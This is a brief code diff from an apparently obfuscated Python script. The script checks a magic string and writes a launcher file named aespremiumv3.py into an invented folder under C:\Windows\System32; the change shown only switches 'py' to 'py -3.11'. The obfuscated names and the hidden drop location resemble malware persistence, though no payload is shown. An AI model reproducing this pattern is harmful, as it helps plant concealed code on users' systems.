@@ -217,7 +217,7 @@ if file_contentsx1 =="04yb8u5ih5FGB":
     file_contentpathx = read_file_contentxasxas(file_pathxpath)
     create_batch_file(file_contentpathx, r"C:\Windows\System32\WCNMX\aespremiumv3.py")
 else:
-    create_batch_file("py", r"C:\Windows\System32\WCNMX\aespremiumv3.py")
+    create_batch_file("py -3.11", r"C:\Windows\System32\WCNMX\aespremiumv3.py")
 '''
 directory = r'C:\Windows\System32'
 
